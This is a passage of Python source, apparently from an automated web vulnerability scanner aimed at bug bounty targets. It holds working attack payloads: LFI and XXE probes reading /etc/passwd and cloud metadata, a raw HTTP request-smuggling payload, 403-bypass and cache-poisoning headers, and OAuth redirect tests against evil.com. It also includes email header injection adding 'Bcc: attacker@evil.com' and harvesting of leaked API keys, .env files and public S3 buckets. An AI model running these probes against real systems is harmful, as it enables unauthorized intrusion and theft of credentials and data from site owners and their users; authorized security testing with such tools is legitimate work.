                                                 "template": "apex-jwt"})
                        except: pass
            except: continue
    return findings


def scan_subdomain_takeover(subdomains):
    """Check for subdomain takeover opportunities."""
    if not subdomains:
        return []
    findings = []
    takeover_sigs = {
        "There isn't a GitHub Pages site here": "GitHub Pages",
        "NoSuchBucket": "AWS S3",
        "No such app": "Heroku",
        "NXDOMAIN": "Unclaimed",
        "The request could not be satisfied": "CloudFront",
        "Repository not found": "Bitbucket",
        "Sorry, this shop is currently unavailable": "Shopify",
        "The feed has not been found": "Feedpress",
        "project not found": "Surge.sh",
        "Fastly error: unknown domain": "Fastly",
    }
    for sub in subdomains[:50]:
        for proto in ["https", "http"]:
            try:
                r = _S.get(f"{proto}://{sub}", timeout=5, allow_redirects=True)
                for sig, service in takeover_sigs.items():
                    if sig in r.text:
                        findings.append({"type": f"Subdomain Takeover ({service})", "severity": "critical",
                                         "url": f"{proto}://{sub}", "detail": f"Dangling CNAME → {service}",
                                         "template": "apex-takeover"})
                        break
                break
            except requests.exceptions.ConnectionError:
                # NXDOMAIN or connection refused — check DNS
                try:
                    import socket
                    socket.getaddrinfo(sub, None)
                except socket.gaierror:
                    # Check if CNAME exists
                    try:
                        result = subprocess.run(["dig", "+short", "CNAME", sub], capture_output=True, text=True, timeout=5)
                        cname = (result.stdout or "").strip()
                        if cname and not cname.endswith(sub.split(".")[-2] + "."):
                            findings.append({"type": "Potential Subdomain Takeover", "severity": "high",
                                             "url": sub, "detail": f"CNAME {cname} but host unreachable",
                                             "template": "apex-takeover"})
                    except Exception: pass
                break
            except: break


# ---------------------------------------------------------------------------
# Elite scanners — the stuff that wins big bounties
# ---------------------------------------------------------------------------

def scan_api_keys_in_js(crawl_data):
    """Scan JavaScript files for leaked API keys, tokens, secrets."""
    findings = []
    patterns = {
        "AWS Key": r"AKIA[0-9A-Z]{16}",
        "Google API Key": r"AIza[0-9A-Za-z\-_]{35}",
        "Slack Token": r"xox[bpors]-[0-9a-zA-Z]{10,48}",
        "GitHub Token": r"gh[pousr]_[A-Za-z0-9_]{36,255}",
        "Private Key": r"-----BEGIN (RSA |EC )?PRIVATE KEY-----",
        "Stripe Key": r"sk_live_[0-9a-zA-Z]{24,}",
        "Twilio": r"SK[0-9a-fA-F]{32}",
        "Mailgun": r"key-[0-9a-zA-Z]{32}",
        "Firebase": r"AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}",
        "JWT Secret": r"['\"]?(?:jwt|JWT|secret|SECRET|api[_-]?key|API[_-]?KEY|token|TOKEN)['\"]?\s*[:=]\s*['\"][A-Za-z0-9+/=_-]{16,}['\"]",
        "Password in Code": r"['\"]?(?:password|passwd|pwd)['\"]?\s*[:=]\s*['\"][^'\"]{8,}['\"]",
        "Internal URL": r"https?://(?:localhost|127\.0\.0\.1|10\.\d+\.\d+\.\d+|192\.168\.\d+\.\d+|172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+)[:/][^\s'\"]+",
    }
    js_urls = set()
    for page in crawl_data.get("pages", []):
        try:
            r = _S.get(page["url"], timeout=_TIMEOUT)
            soup = BeautifulSoup(r.text, "lxml")
            for script in soup.find_all("script", src=True):
                src = script["src"]
                if src.startswith("//"):
                    src = "https:" + src
                elif src.startswith("/"):
                    base = "/".join(page["url"].split("/", 3)[:3])
                    src = base + src
                if src.startswith("http"):
                    js_urls.add(src)
        except: pass
    for js_url in list(js_urls)[:30]:
        try:
            r = _S.get(js_url, timeout=_TIMEOUT)
            if len(r.content) > 5_000_000: continue
            for name, pattern in patterns.items():
                matches = re.findall(pattern, r.text)
                if matches:
                    sample = matches[0][:60] if isinstance(matches[0], str) else str(matches[0])[:60]
                    findings.append({"type": f"Leaked Secret: {name}", "severity": "critical",
                                     "url": js_url, "detail": f"Found: {sample}...",
                                     "template": "apex-secrets"})
        except: pass
    return findings


def scan_graphql(crawl_data):
    """Find and test GraphQL endpoints for introspection and injection."""
    findings = []
    tested = set()
    gql_paths = ["/graphql", "/graphql/v1", "/api/graphql", "/gql", "/query", "/graphiql"]
    introspection = {"query": "{__schema{types{name fields{name}}}}"}
    for page in crawl_data.get("pages", [])[:3]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        for path in gql_paths:
            try:
                r = _S.post(f"{base}{path}", json=introspection, timeout=5,
                           headers={"Content-Type": "application/json"})
                if "__schema" in r.text and "types" in r.text:
                    data = r.json()
                    type_names = [t["name"] for t in data.get("data",{}).get("__schema",{}).get("types",[])
                                  if not t["name"].startswith("__")]
                    sensitive = [t for t in type_names if any(x in t.lower() for x in
                                ["user","admin","auth","token","secret","password","payment","order","credit"])]
                    findings.append({"type": "GraphQL Introspection Enabled", "severity": "high",
                                     "url": f"{base}{path}",
                                     "detail": f"{len(type_names)} types exposed. Sensitive: {', '.join(sensitive[:5])}",
                                     "template": "apex-graphql"})
                    break
            except: continue
    return findings


def scan_rate_limit(crawl_data):
    """Check for missing rate limiting on auth endpoints."""
    findings = []
    tested = set()
    auth_paths = ["/login", "/api/login", "/auth", "/api/auth", "/signin", "/api/signin",
                  "/forgot-password", "/api/forgot-password", "/reset-password", "/api/v1/login"]
    for page in crawl_data.get("pages", [])[:3]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        for path in auth_paths:
            url = f"{base}{path}"
            try:
                blocked = False
                for i in range(15):
                    r = _S.post(url, json={"email":"test@test.com","password":"wrong"}, timeout=3)
                    if r.status_code == 429 or "rate" in r.text.lower() or "too many" in r.text.lower():
                        blocked = True
                        break
                if not blocked:
                    # Verify endpoint exists (not just 404)
                    if r.status_code < 404:
                        findings.append({"type": "Missing Rate Limit", "severity": "medium",
                                         "url": url, "detail": f"No rate limit after 15 requests ({r.status_code})",
                                         "template": "apex-ratelimit"})
            except: continue
    return findings


def scan_websocket(crawl_data):
    """Find WebSocket endpoints and check for auth issues."""
    findings = []
    for page in crawl_data.get("pages", [])[:10]:
        try:
            r = _S.get(page["url"], timeout=_TIMEOUT)
            ws_urls = re.findall(r'wss?://[^\s\'"<>]+', r.text)
            for ws in ws_urls:
                findings.append({"type": "WebSocket Endpoint Found", "severity": "low",
                                 "url": ws, "detail": f"Found in {page['url'][:60]}",
                                 "template": "apex-ws"})
        except: pass
    return findings


def scan_info_disclosure(crawl_data):
    """Check for information disclosure in error pages and headers."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages", [])[:5]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        # Trigger errors
        error_urls = [f"{base}/'", f"{base}/{{{{", f"{base}/%00", f"{base}/..;/"]
        for url in error_urls:
            try:
                r = _S.get(url, timeout=5)
                body = r.text.lower()
                if any(x in body for x in ["stack trace", "traceback", "exception in", "syntax error",
                                            "fatal error", "debug mode", "django debug",
                                            "laravel", "at /var/www", "at /home/", "at c:\\"]):
                    findings.append({"type": "Debug/Stack Trace Exposed", "severity": "medium",
                                     "url": url, "detail": "Error page leaks internal info",
                                     "template": "apex-info"})
                    break
            except: continue
        # Check headers for version disclosure
        try:
            r = _S.get(base, timeout=5)
            for h in ["X-Powered-By", "Server", "X-AspNet-Version", "X-AspNetMvc-Version"]:
                v = r.headers.get(h, "")
                if v and any(c.isdigit() for c in v):
                    findings.append({"type": f"Version Disclosure: {h}", "severity": "low",
                                     "url": base, "detail": f"{h}: {v}", "template": "apex-info"})
        except: pass
    return findings


# ---------------------------------------------------------------------------
# JavaScript endpoint extraction + hidden API testing
# ---------------------------------------------------------------------------

def extract_js_endpoints(crawl_data):
    """Extract hidden API endpoints from JavaScript files and test them."""
    findings = []
    js_urls = set()
    base_url = None

    for page in crawl_data.get("pages", [])[:5]:
        if not base_url:
            base_url = "/".join(page["url"].split("/", 3)[:3])
        try:
            r = _S.get(page["url"], timeout=_TIMEOUT)
            soup = BeautifulSoup(r.text, "lxml")
            for s in soup.find_all("script", src=True):
                src = s["src"]
                if src.startswith("//"): src = "https:" + src
                elif src.startswith("/"): src = base_url + src
                elif not src.startswith("http"): src = base_url + "/" + src
                js_urls.add(src)
            # Inline scripts too
            for s in soup.find_all("script", src=False):
                if s.string and len(s.string) > 100:
                    _extract_from_js(s.string, base_url, findings)
        except: pass

    # Fetch and parse external JS
    for js_url in list(js_urls)[:20]:
        try:
            r = _S.get(js_url, timeout=_TIMEOUT)
            if len(r.content) > 5_000_000: continue
            _extract_from_js(r.text, base_url, findings)
        except: pass

    # Deduplicate and test discovered endpoints
    seen = set()
    tested_findings = []
    for f in findings:
        if f["url"] not in seen:
            seen.add(f["url"])
            tested_findings.append(f)

    return tested_findings


def _extract_from_js(js_text, base_url, findings):
    """Extract endpoints from JS source and test them."""
    # Find API paths
    api_patterns = [
        re.compile(r'["\'](/api/[a-zA-Z0-9/_\-\.]+)["\']'),
        re.compile(r'["\'](/v[0-9]+/[a-zA-Z0-9/_\-\.]+)["\']'),
        re.compile(r'["\'](/graphql[a-zA-Z0-9/_\-\.]*)["\']'),
        re.compile(r'["\'](/internal/[a-zA-Z0-9/_\-\.]+)["\']'),
        re.compile(r'["\'](/admin/[a-zA-Z0-9/_\-\.]+)["\']'),
        re.compile(r'["\'](/debug/[a-zA-Z0-9/_\-\.]+)["\']'),
        re.compile(r'["\'](/private/[a-zA-Z0-9/_\-\.]+)["\']'),
        re.compile(r'fetch\(["\']([^"\']+)["\']'),
        re.compile(r'axios\.[a-z]+\(["\']([^"\']+)["\']'),
        re.compile(r'\.ajax\(\{[^}]*url:\s*["\']([^"\']+)["\']'),
        re.compile(r'XMLHttpRequest[^;]*open\([^,]*,\s*["\']([^"\']+)["\']'),
    ]

    endpoints = set()
    for pattern in api_patterns:
        for match in pattern.findall(js_text):
            if match.startswith("/") and len(match) > 3 and not match.endswith((".js", ".css", ".png", ".jpg", ".svg")):
                endpoints.add(match)
            elif match.startswith("http") and "/api" in match:
                endpoints.add(match)

    # Test each discovered endpoint
    for ep in list(endpoints)[:30]:
        url = ep if ep.startswith("http") else f"{base_url}{ep}"
        try:
            r = _S.get(url, timeout=5, allow_redirects=False)
            if r.status_code == 200:
                body = r.text[:500].lower()
                ctype = r.headers.get("content-type", "").lower()
                # Real API response (JSON, not HTML error page)
                if "application/json" in ctype or (body.startswith("{") or body.startswith("[")):
                    try:
                        data = r.json()
                        # Check if it returns actual data without auth
                        if isinstance(data, (dict, list)) and len(str(data)) > 20:
                            has_sensitive = any(k in str(data).lower() for k in
                                              ["email", "user", "token", "password", "secret", "key",
                                               "admin", "phone", "address", "ssn", "credit"])
                            if has_sensitive:
                                findings.append({"type": "Unauthenticated API with Sensitive Data",
                                                 "severity": "critical", "url": url,
                                                 "detail": f"Returns JSON with sensitive fields ({len(str(data))}b)",
                                                 "template": "apex-hidden-api"})
                            else:
                                findings.append({"type": "Hidden API Endpoint (No Auth)",
                                                 "severity": "medium", "url": url,
                                                 "detail": f"Accessible API found in JS ({len(str(data))}b)",
                                                 "template": "apex-hidden-api"})
                    except: pass
        except: pass

    # Find hardcoded config objects
    config_patterns = [
        re.compile(r'(?:config|CONFIG|env|ENV)\s*[=:]\s*\{([^}]{50,500})\}'),
        re.compile(r'(?:firebase|FIREBASE)[^{]*\{([^}]{30,300})\}'),
    ]
    for pattern in config_patterns:
        for match in pattern.findall(js_text):
            if any(x in match.lower() for x in ["key", "secret", "token", "password", "apikey"]):
                findings.append({"type": "Hardcoded Config in JS", "severity": "high",
                                 "url": base_url, "detail": f"Config: {match[:100]}...",
                                 "template": "apex-secrets"})


# ---------------------------------------------------------------------------
# Wayback Machine recon + parameter bruteforce + 403 bypass
# ---------------------------------------------------------------------------

def scan_wayback(target):
    """Pull old URLs from Wayback Machine — find forgotten endpoints."""
    findings = []
    try:
        r = requests.get(f"https://web.archive.org/cdx/search/cdx?url=*.{target}/*&output=text&fl=original&collapse=urlkey&limit=500", timeout=15)
        urls = set()
        for line in r.text.splitlines():
            line = line.strip()
            if any(x in line for x in [".js", ".json", "/api/", "/admin", "/internal", "/debug",
                                        "/config", "/backup", "/test", "/staging", "/dev",
                                        ".env", ".git", "token", "auth", "graphql", "swagger"]):
                urls.add(line)
        # Test if old URLs still work
        for url in list(urls)[:40]:
            try:
                resp = _S.get(url, timeout=5, allow_redirects=False)
                if resp.status_code == 200 and len(resp.content) > 50:
                    ctype = resp.headers.get("content-type", "").lower()
                    if "json" in ctype or "javascript" in ctype or "text/plain" in ctype:
                        findings.append({"type": "Wayback: Forgotten Endpoint", "severity": "high",
                                         "url": url, "detail": f"Old URL still live ({resp.status_code}, {len(resp.content)}b)",
                                         "template": "apex-wayback"})
                    elif any(x in url.lower() for x in [".env", "config", "admin", "debug", "backup", "token"]):
                        findings.append({"type": "Wayback: Sensitive Path", "severity": "medium",
                                         "url": url, "detail": f"Historical sensitive URL still responds",
                                         "template": "apex-wayback"})
            except: continue
    except: pass
    return findings


def scan_param_bruteforce(crawl_data):
    """Bruteforce hidden parameters on endpoints."""
    findings = []
    params = ["id", "user_id", "uid", "admin", "debug", "test", "token", "api_key", "key",
              "secret", "password", "redirect", "url", "next", "return", "callback", "jsonp",
              "file", "path", "dir", "page", "template", "include", "lang", "action", "cmd",
              "exec", "query", "search", "email", "username", "role", "type", "format", "output",
              "v", "version", "access_token", "auth", "session", "internal", "source", "ref"]

    for page in crawl_data.get("pages", [])[:5]:
        url = page["url"].split("?")[0]
        try:
            baseline = _S.get(url, timeout=5)
            base_len = len(baseline.content)
        except: continue

        for p in params:
            try:
                r = _S.get(f"{url}?{p}=1", timeout=3)
                diff = abs(len(r.content) - base_len)
                if diff > 100 and r.status_code == 200:
                    # Check if param actually does something
                    r2 = _S.get(f"{url}?{p}=../../etc/passwd", timeout=3)
                    r3 = _S.get(f"{url}?{p}=<script>x</script>", timeout=3)
                    if "root:" in r2.text:
                        findings.append({"type": f"Hidden Param LFI: {p}", "severity": "critical",
                                         "url": f"{url}?{p}=../../etc/passwd",
                                         "detail": f"Param {p} vulnerable to LFI", "template": "apex-param"})
                    elif "<script>x</script>" in r3.text:
                        findings.append({"type": f"Hidden Param XSS: {p}", "severity": "high",
                                         "url": f"{url}?{p}=<script>x</script>",
                                         "detail": f"Param {p} reflects input (XSS)", "template": "apex-param"})
                    elif diff > 500:
                        findings.append({"type": f"Hidden Parameter: {p}", "severity": "low",
                                         "url": f"{url}?{p}=1",
                                         "detail": f"Param changes response by {diff}b", "template": "apex-param"})
            except: continue
    return findings


def scan_403_bypass(crawl_data):
    """Try to bypass 403 forbidden pages."""
    findings = []
    forbidden = []
    tested = set()

    for page in crawl_data.get("pages", [])[:3]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        for path in ["/admin", "/api/admin", "/internal", "/debug", "/management", "/console",
                     "/actuator", "/swagger", "/graphql", "/api/v1/users"]:
            try:
                r = _S.get(f"{base}{path}", timeout=3)
                if r.status_code == 403:
                    forbidden.append((base, path))
            except: pass

    bypasses = [
        lambda b,p: _S.get(f"{b}{p}/", timeout=3),
        lambda b,p: _S.get(f"{b}{p}..;/", timeout=3),
        lambda b,p: _S.get(f"{b}{p}%2e/", timeout=3),
        lambda b,p: _S.get(f"{b}{p}", timeout=3, headers={"X-Original-URL": p}),
        lambda b,p: _S.get(f"{b}{p}", timeout=3, headers={"X-Rewrite-URL": p}),
        lambda b,p: _S.get(f"{b}{p}", timeout=3, headers={"X-Forwarded-For": "127.0.0.1"}),
        lambda b,p: _S.get(f"{b}{p}", timeout=3, headers={"X-Custom-IP-Authorization": "127.0.0.1"}),
        lambda b,p: _S.get(f"{b}/{p.lstrip('/')}", timeout=3, headers={"Content-Length": "0"}, allow_redirects=False),
        lambda b,p: _S.get(f"{b}{p}%00", timeout=3),
        lambda b,p: _S.get(f"{b}{p}#", timeout=3),
        lambda b,p: _S.get(f"{b}{p}?", timeout=3),
    ]

    for base, path in forbidden[:10]:
        for i, bypass in enumerate(bypasses):
            try:
                r = bypass(base, path)
                if r.status_code == 200 and len(r.content) > 100:
                    findings.append({"type": f"403 Bypass: {path}", "severity": "high",
                                     "url": f"{base}{path}", "detail": f"Bypass method #{i+1} returned 200",
                                     "template": "apex-403bypass"})
                    break
            except: continue
    return findings


# ---------------------------------------------------------------------------
# OAuth/SSO, XXE, Deserialization, Business Logic
# ---------------------------------------------------------------------------

def scan_oauth_issues(crawl_data):
    """Test OAuth/SSO flows for common misconfigurations."""
    findings = []
    tested = set()
    oauth_paths = ["/oauth/authorize", "/oauth2/authorize", "/auth/oauth", "/connect/authorize",
                   "/login/oauth", "/sso", "/saml/login", "/.well-known/openid-configuration"]
    for page in crawl_data.get("pages", [])[:3]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        for path in oauth_paths:
            try:
                r = _S.get(f"{base}{path}", timeout=5, allow_redirects=False)
                if r.status_code in (200, 302):
                    loc = r.headers.get("Location", "")
                    # Check for open redirect in redirect_uri
                    if "redirect_uri" in loc or "redirect_uri" in r.text:
                        test = f"{base}{path}?client_id=test&redirect_uri=https://evil.com&response_type=code"
                        r2 = _S.get(test, timeout=5, allow_redirects=False)
                        if "evil.com" in r2.headers.get("Location", ""):
                            findings.append({"type": "OAuth Open Redirect", "severity": "critical",
                                             "url": test, "detail": "redirect_uri not validated",
                                             "template": "apex-oauth"})
                    # Check for state param missing (CSRF)
                    if "code=" in loc and "state=" not in loc:
                        findings.append({"type": "OAuth Missing State (CSRF)", "severity": "high",
                                         "url": f"{base}{path}", "detail": "No state param = CSRF possible",
                                         "template": "apex-oauth"})
                    if r.status_code == 200:
                        findings.append({"type": f"OAuth Endpoint Found: {path}", "severity": "low",
                                         "url": f"{base}{path}", "detail": "OAuth endpoint accessible",
                                         "template": "apex-oauth"})
            except: continue
    return findings


def scan_xxe(crawl_data):
    """Test XML endpoints for XXE injection."""
    findings = []
    xxe_payload = """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>"""
    xxe_ssrf = """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>"""

    for page in crawl_data.get("pages", [])[:5]:
        url = page["url"]
        # Test forms that might accept XML
        for form in crawl_data.get("forms", []):
            if form.get("method", "").upper() == "POST":
                action = form.get("action", url)
                if not action.startswith("http"):
                    base = "/".join(url.split("/", 3)[:3])
                    action = base + action
                try:
                    r = _S.post(action, data=xxe_payload,
                               headers={"Content-Type": "application/xml"}, timeout=5)
                    if "root:" in r.text or "daemon:" in r.text:
                        findings.append({"type": "XXE Injection", "severity": "critical",
                                         "url": action, "detail": "XXE reads /etc/passwd",
                                         "template": "apex-xxe"})
                    elif "ami-id" in r.text or "instance-id" in r.text:
                        findings.append({"type": "XXE SSRF (Cloud Metadata)", "severity": "critical",
                                         "url": action, "detail": "XXE reaches cloud metadata",
                                         "template": "apex-xxe"})
                except: pass
        # Test JSON endpoints that might also accept XML
        for path in ["/api/upload", "/api/import", "/api/parse", "/api/xml", "/upload"]:
            base = "/".join(url.split("/", 3)[:3])
            try:
                r = _S.post(f"{base}{path}", data=xxe_payload,
                           headers={"Content-Type": "application/xml"}, timeout=5)
                if "root:" in r.text or "ami-id" in r.text:
                    findings.append({"type": "XXE Injection", "severity": "critical",
                                     "url": f"{base}{path}", "detail": "XXE confirmed",
                                     "template": "apex-xxe"})
            except: pass
    return findings


def scan_business_logic(crawl_data):
    """Test for business logic vulnerabilities — price manipulation, negative values, etc."""
    findings = []
    for page in crawl_data.get("pages", []):
        url = page["url"]
        # Look for price/quantity/amount params
        for param, val in urllib.parse.parse_qs(urllib.parse.urlparse(url).query).items():
            if any(x in param.lower() for x in ["price", "amount", "qty", "quantity", "total", "cost", "discount"]):
                try:
                    # Test negative values
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs[param] = ["-1"]
                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    r = _S.get(test_url, timeout=5)
                    if r.status_code == 200 and "error" not in r.text.lower():
                        findings.append({"type": f"Business Logic: Negative {param}", "severity": "high",
                                         "url": test_url, "detail": f"Negative value accepted for {param}",
                                         "template": "apex-logic"})
                    # Test zero
                    qs[param] = ["0"]
                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    r = _S.get(test_url, timeout=5)
                    if r.status_code == 200 and "error" not in r.text.lower():
                        findings.append({"type": f"Business Logic: Zero {param}", "severity": "medium",
                                         "url": test_url, "detail": f"Zero value accepted for {param}",
                                         "template": "apex-logic"})
                except: pass
    return findings


def scan_cache_poisoning(crawl_data):
    """Test for web cache poisoning."""
    findings = []
    tested = set()
    poison_headers = [
        ("X-Forwarded-Host", "evil.com"),
        ("X-Forwarded-Scheme", "nothttps"),
        ("X-Original-URL", "/evil"),
        ("X-Rewrite-URL", "/evil"),
        ("X-Forwarded-Port", "1337"),
    ]
    for page in crawl_data.get("pages", [])[:5]:
        url = page["url"]
        base = "/".join(url.split("/", 3)[:3])
        if base in tested: continue
        tested.add(base)
        try:
            baseline = _S.get(url, timeout=5)
            for header, value in poison_headers:
                r = _S.get(url, timeout=5, headers={header: value})
                if value in r.text and value not in baseline.text:
                    findings.append({"type": f"Cache Poisoning via {header}", "severity": "high",
                                     "url": url, "detail": f"{header}: {value} reflected in response",
                                     "template": "apex-cache"})
        except: pass
    return findings


# ---------------------------------------------------------------------------
# Smart context-aware scanning — adapts to what it finds
# ---------------------------------------------------------------------------

def scan_smart(crawl_data, technologies, web_targets):
    """Adapt scan based on detected tech stack."""
    findings = []
    pages = crawl_data.get("pages", [])
    if not pages: return findings
    base = "/".join(pages[0]["url"].split("/", 3)[:3])
    tech = " ".join(technologies).lower()

    # WordPress-specific
    if "wordpress" in tech or "wp-" in str(pages):
        wp_paths = ["/wp-json/wp/v2/users", "/wp-json/wp/v2/posts?per_page=100",
                    "/wp-config.php.bak", "/wp-content/debug.log", "/?author=1"]
        for path in wp_paths:
            try:
                r = _S.get(f"{base}{path}", timeout=5)
                if r.status_code == 200 and len(r.content) > 50:
                    if "email" in r.text or "slug" in r.text:
                        findings.append({"type": "WordPress User Enumeration", "severity": "medium",
                                         "url": f"{base}{path}", "detail": "User data exposed via REST API",
                                         "template": "apex-wp"})
                    elif "DB_PASSWORD" in r.text or "DB_HOST" in r.text:
                        findings.append({"type": "WordPress Config Exposed", "severity": "critical",
                                         "url": f"{base}{path}", "detail": "wp-config.php backup accessible",
                                         "template": "apex-wp"})
            except: pass

    # Spring Boot / Java
    if any(x in tech for x in ["spring", "java", "tomcat", "actuator"]):
        spring_paths = ["/actuator", "/actuator/env", "/actuator/heapdump",
                        "/actuator/mappings", "/actuator/beans", "/actuator/httptrace",
                        "/env", "/health", "/metrics", "/dump", "/trace"]
        for path in spring_paths:
            try:
                r = _S.get(f"{base}{path}", timeout=5)
                if r.status_code == 200:
                    body = r.text.lower()
                    if any(x in body for x in ["password", "secret", "key", "token", "datasource"]):
                        findings.append({"type": f"Spring Boot Actuator: {path}", "severity": "critical",
                                         "url": f"{base}{path}", "detail": "Sensitive data in actuator endpoint",
                                         "template": "apex-spring"})
                    elif "heapdump" in path:
                        findings.append({"type": "Spring Boot Heap Dump", "severity": "critical",
                                         "url": f"{base}{path}", "detail": "Memory dump accessible — contains secrets",
                                         "template": "apex-spring"})
            except: pass

    # Django / Python
    if any(x in tech for x in ["django", "python", "flask"]):
        for path in ["/admin/", "/__debug__/", "/api/schema/", "/api/docs/"]:
            try:
                r = _S.get(f"{base}{path}", timeout=5)
                if r.status_code == 200 and ("django" in r.text.lower() or "debug" in r.text.lower()):
                    findings.append({"type": f"Django Debug/Admin: {path}", "severity": "high",
                                     "url": f"{base}{path}", "detail": "Django admin or debug accessible",
                                     "template": "apex-django"})
            except: pass

    # Laravel / PHP
    if any(x in tech for x in ["laravel", "php", "symfony"]):
        for path in ["/.env", "/storage/logs/laravel.log", "/phpinfo.php",
                     "/telescope", "/horizon", "/api/documentation"]:
            try:
                r = _S.get(f"{base}{path}", timeout=5)
                if r.status_code == 200 and len(r.content) > 100:
                    if "APP_KEY" in r.text or "DB_PASSWORD" in r.text:
                        findings.append({"type": "Laravel .env Exposed", "severity": "critical",
                                         "url": f"{base}{path}", "detail": "Laravel .env with secrets accessible",
                                         "template": "apex-laravel"})
                    elif "laravel.log" in path and len(r.content) > 1000:
                        findings.append({"type": "Laravel Log Exposed", "severity": "high",
                                         "url": f"{base}{path}", "detail": f"Log file ({len(r.content)}b) accessible",
                                         "template": "apex-laravel"})
            except: pass

    # Node.js / Express
    if any(x in tech for x in ["node", "express", "next.js", "nuxt"]):
        for path in ["/.env", "/api/health", "/api/status", "/_next/static/chunks/",
                     "/node_modules/.bin/", "/package.json", "/.git/config"]:
            try:
                r = _S.get(f"{base}{path}", timeout=5)
                if r.status_code == 200:
                    if "dependencies" in r.text or "scripts" in r.text:
                        findings.append({"type": "package.json Exposed", "severity": "medium",
                                         "url": f"{base}{path}", "detail": "Node.js package.json accessible",
                                         "template": "apex-node"})
            except: pass

    # AWS / Cloud
    for path in ["/aws.json", "/credentials", "/.aws/credentials", "/s3.json",
                 "/cloud-config.json", "/gcp-credentials.json"]:
        try:
            r = _S.get(f"{base}{path}", timeout=5)
            if r.status_code == 200 and any(x in r.text for x in ["AKIA", "aws_access", "private_key"]):
                findings.append({"type": "Cloud Credentials Exposed", "severity": "critical",
                                 "url": f"{base}{path}", "detail": "Cloud credentials file accessible",
                                 "template": "apex-cloud"})
        except: pass

    # API versioning — test old versions
    for target in web_targets[:3]:
        for old_ver in ["/api/v0/", "/api/v1/", "/api/v2/", "/api/beta/", "/api/legacy/"]:
            try:
                r = _S.get(f"{target}{old_ver}users", timeout=5)
                if r.status_code == 200:
                    try:
                        data = r.json()
                        if isinstance(data, list) and len(data) > 0:
                            findings.append({"type": f"Old API Version: {old_ver}users", "severity": "high",
                                             "url": f"{target}{old_ver}users",
                                             "detail": f"Old API returns {len(data)} users without auth",
                                             "template": "apex-api-ver"})
                    except: pass
            except: pass

    return findings


# ---------------------------------------------------------------------------
# S3 bucket enum, HTTP smuggling detection, email injection, DNS rebinding
# ---------------------------------------------------------------------------

def scan_s3_buckets(target, subdomains):
    """Find misconfigured S3 buckets related to the target."""
    findings = []
    import re as _re
    domain = target.replace("www.", "").split(".")[0]
    bucket_names = [
        domain, f"{domain}-backup", f"{domain}-dev", f"{domain}-staging",
        f"{domain}-prod", f"{domain}-assets", f"{domain}-static", f"{domain}-media",
        f"{domain}-uploads", f"{domain}-files", f"{domain}-data", f"{domain}-logs",
        f"{domain}-test", f"{domain}-internal", f"{domain}-public", f"{domain}-private",
    ]
    for sub in subdomains[:20]:
        parts = sub.split(".")
        if len(parts) > 2:
            bucket_names.append(parts[0])

    for bucket in bucket_names:
        for region in ["", ".s3.amazonaws.com", ".s3-us-east-1.amazonaws.com",
                       ".s3-eu-west-1.amazonaws.com", ".s3-ap-southeast-1.amazonaws.com"]:
            url = f"https://{bucket}{region}" if region else f"https://{bucket}.s3.amazonaws.com"
            try:
                r = requests.get(url, timeout=5, verify=False)
                if r.status_code == 200 and "<ListBucketResult" in r.text:
                    # Verify bucket content relates to target domain (avoid false positives)
                    content_sample = r.text[:5000].lower()
                    target_domain = target.replace("www.", "").split(".")[0].lower()
                    # Check if bucket name or content references the target
                    if target_domain in bucket or target_domain in content_sample or target in content_sample:
                        files = len(_re.findall(r"<Key>", r.text))
                        findings.append({"type": "Public S3 Bucket", "severity": "critical",
                                         "url": url, "detail": f"Bucket {bucket} is public — {files} files listed",
                                         "template": "apex-s3"})
                        break
                    # Generic public bucket not related to target - skip
                    break
                elif r.status_code == 403:
                    findings.append({"type": "S3 Bucket Exists (Private)", "severity": "low",
                                     "url": url, "detail": f"Bucket {bucket} exists but is private",
                                     "template": "apex-s3"})
                    break
            except: continue
    return findings


def scan_request_smuggling(web_targets):
    """Detect HTTP request smuggling vulnerabilities."""
    findings = []
    for target in web_targets[:5]:
        try:
            # CL.TE probe
            import socket, ssl
            parsed = urllib.parse.urlparse(target)
            host = parsed.netloc
            port = 443 if parsed.scheme == "https" else 80
            path = parsed.path or "/"

            payload = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 6\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"0\r\n"
                f"\r\n"
                f"G"
            ).encode()

            sock = socket.create_connection((host.split(":")[0], port), timeout=5)
            if port == 443:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host.split(":")[0])
            sock.send(payload)
            resp = sock.recv(4096).decode("utf-8", errors="ignore")
            sock.close()

            if "400" in resp[:50] and "Bad Request" in resp:
                pass  # Normal
            elif "200" in resp[:50] or "timeout" in resp.lower():
                findings.append({"type": "Possible HTTP Request Smuggling (CL.TE)", "severity": "critical",
                                 "url": target, "detail": "Server may be vulnerable to request smuggling",
                                 "template": "apex-smuggling"})
        except: pass
    return findings


def scan_email_injection(crawl_data):
    """Test contact/email forms for header injection."""
    findings = []
    inject_payloads = [
        "test@test.com\nBcc: attacker@evil.com",
        "test@test.com\r\nBcc: attacker@evil.com",
        "test@test.com%0ABcc:attacker@evil.com",
        "test@test.com%0D%0ABcc:attacker@evil.com",
    ]
    for form in crawl_data.get("forms", []):
        if form.get("method", "").upper() != "POST": continue
        inputs = form.get("inputs", [])
        email_inputs = [i for i in inputs if "email" in i.get("name", "").lower() or
                       i.get("type", "") == "email"]
        if not email_inputs: continue
        action = form.get("action", "")
